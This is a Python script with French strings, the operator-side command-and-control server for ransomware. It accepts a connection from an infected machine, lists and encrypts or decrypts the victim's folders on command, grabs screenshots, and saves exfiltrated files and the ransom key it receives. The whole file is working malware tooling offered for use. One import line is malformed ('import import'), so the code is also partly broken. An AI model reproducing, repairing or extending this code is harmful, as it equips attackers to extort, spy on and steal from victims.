import socket
import os
import select
from datetime import import datetime

HOST = "0.0.0.0"
PORT = 5001
CAPTURE_DIR = "captures"
EXFIL_DIR = "donnees_windows"
KEY_FILE = "ransom_key_received.key"

def load_key():
    with open(KEY_FILE, "rb") as f:
        return f.read()

def save_key(data):
    with open(KEY_FILE, "wb") as f:
        f.write(data)
    print(f"[+] Clé de chiffrement reçue et sauvegardée dans {KEY_FILE}.")

def list_captures():
    if not os.path.exists(CAPTURE_DIR):
        print("[!] Aucun dossier 'captures' trouvé.")
        return

    files = os.listdir(CAPTURE_DIR)
    if not files:
        print("[!] Aucune capture disponible.")
    else:
        print("[+] Captures disponibles :")
        for f in files:
            print(f" - {f}")

def start_server():
    if not os.path.exists(CAPTURE_DIR):
        os.makedirs(CAPTURE_DIR)
    if not os.path.exists(EXFIL_DIR):
        os.makedirs(EXFIL_DIR)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[+] Serveur en attente de connexion sur {HOST}:{PORT}...")
        conn, addr = server.accept()
        print(f"[+] Connexion établie avec {addr}")

        while True:
            print("\n[ Menu ]")
            print("1 - Lister les dossiers et chiffrer un dossier au choix")
            print("2 - Lister les dossiers chiffrés sur la cible et déchiffrer")
            print("3 - Prendre une capture d'écran")
            print("4 - Afficher les captures")
            print("5 - Quitter")

            ready, _, _ = select.select([conn], [], [], 0.5)
            if ready:
                header = conn.recv(128)
                if header.startswith(b"exfil:"):
                    parts = header.decode(errors="ignore").split(":")
                    if len(parts) > 3:
                        filename = parts[1]
                        filesize = int(parts[2].strip())
                        save_path = os.path.join(EXFIL_DIR, filename)

                        with open(save_path, "wb") as f:
                            received = 0
                            while received < filesize:
                                chunk = conn.recv(min(4096, filesize - received))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received += len(chunk)
                        print(f"Fichier exfiltré sauvegardé : {save_path}")
                    continue

            choice = input("Choisissez une option : ")

            if choice == "1":
                conn.sendall(b"listdirs")
                print("[+] Demande de listing des dossiers envoyée...")
                data = conn.recv(8192).decode()
                print("\n[*] Dossiers disponibles sur la cible :\n")
                print(data)

                selected = input("\n[?] Entrez le chemin complet du dossier à chiffrer : ").strip()
                conn.sendall(f"encrypt:{selected}".encode())
                print(f"[+] Demande de chiffrement envoyée pour {selected}")

            elif choice == "2":
                conn.sendall(b"key_request")
                print("[+] Demande de clé envoyée ...")

                while True:
                    response = conn.recv(8192)
                    if not response.startswith(b"key:"):
                        break
                    print("[+] Clé reçue et ignorée pour cette commande.")

                decoded = response.decode(errors="ignore")
                if decoded.strip() == "" or "Aucun dossier" in decoded:
                    print("[!] Aucun dossier chiffré enregistré.")
                else:
                    print("\n[*] Dossiers chiffrés disponibles :\n")
                    print(decoded)

                    selected = input("\n[?] Entrez le chemin complet du dossier à déchiffrer : ").strip()
                    conn.sendall(f"decrypt:{selected}".encode())
                    print(f"[-] Demande de déchiffrement envoyée pour {selected}")

            elif choice == "3":
                conn.sendall(b"screenshot")
                print("[+] Demande de capture d'écran envoyée.")
                size_data = conn.recv(16)

                if size_data.startswith(b"key:"):
                    key_data = size_data[4:] + conn.recv(4096)
                    save_key(key_data)
                    return

                try:
                    total_size = int(size_data.decode().strip())
                except ValueError:
                    print("[!] Erreur : données invalides pour la taille de l'image.")
                    return

                received_data = b""
                while len(received_data) < total_size:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    received_data += chunk

                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{CAPTURE_DIR}/screenshot_{timestamp}.jpg"
                with open(filename, "wb") as f:
                    f.write(received_data)
                print(f"[+] Capture enregistrée sous {filename}")

            elif choice == "4":
                list_captures()

            elif choice == "5":
                conn.sendall(b"exit")
                print("[+] Fermeture de la connexion.")
                break

            else:
                print("[!] Option invalide, réessayez.")

if __name__ == "__main__":
    start_server()
